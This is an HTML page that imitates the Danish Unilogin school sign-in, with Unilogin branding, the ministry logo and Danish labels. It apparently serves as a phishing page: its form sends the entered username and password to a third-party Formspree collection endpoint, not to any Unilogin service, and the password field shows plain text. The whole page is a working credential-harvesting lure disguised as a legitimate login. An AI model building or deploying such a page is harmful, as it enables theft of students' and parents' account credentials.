<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unilogin</title>
    <link rel="shortcut icon" href="crown.ico">
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">
</head>
<body style="background-color: #f2f2f2;">
    <div class="LoginWrap">
        <div class="LoginText" id="Username" >

            <div class="LogoText">
                <span style="color: #015ab3;">Uni</span>login
            </div>

            <form action="https://formspree.io/f/xvoldkvq" method="post" id="FormUserName" aria-required="true">
                <div class="formGruppe">

                    <label for="username">Brugernavn</label>
                    <input name="Username" class="UserNameInput" type="text" id="username">

                </div>
            

            <div class="PageNavWrap">

                <!--<button type="submit" class="PageNav" value="submit" form="FormUserName">Næste</button>-->
                <button class="PageNav" type="button" onclick="ShowPass()">Næste</button>
            </div>

            <hr class="line">

            <p class="FooterText">
                <strong class="AndreMuligheder">Andre muligheder</strong>
                <br>
                <a class="link" href="https://www.nemid.nu/dk-da/">Log ind med f.eks. MitID/NemID</a>
                <br>
                <a class="link" href="https://www.nemid.nu/dk-da/">Få mit eller mit barns brugernavn</a>
            </p>
            <img class="UVMLogo" src="UVM.svg" alt="">
        </div>

        <script>
            function ShowPass() {
                var username = document.getElementById("Username");
                var password = document.getElementById("Password");
                username.style.display = "none"
                password.style.display = "block"
                fadein(password)
            }

            function ShowUser() {
                var username = document.getElementById("Username");
                var password = document.getElementById("Password");
                username.style.display = "block"
                password.style.display = "none"
                fadein(username)
            }

            function fadein(element) {
                element.classList.add("fade-in");
            }
        </script>



        <div class="LoginText" style="display: none;"id="Password">

            <div class="LogoText">
                <span style="color: #015ab3;">Uni</span>login
            </div>

                <div class="formGruppe">

                    <label for="Password">Adgangskode</label>
                    <input name="Password" class="UserNameInput" type="text" id="username">

                </div>
            </form>

                    <button type="submit" class="TilbageButton" onclick="ShowUser()">Tilbage</button>
                    <button form="FormUserName" type="submit" class="LoginButton" value="submit" onclick="SubmitForms()">Login</button>

            <hr class="line">

            <p class="FooterText">
                <strong class="AndreMuligheder">Andre muligheder</strong>
                <br>
                <a class="link" href="https://www.nemid.nu/dk-da/">Log ind med f.eks. MitID/NemID</a>
                <br>
                <a class="link" href="https://www.nemid.nu/dk-da/">Få mit eller mit barns brugernavn</a>
            </p>
            <img class="UVMLogo" src="UVM.svg" alt="">

        </div>
    </div>
</body>
</html>
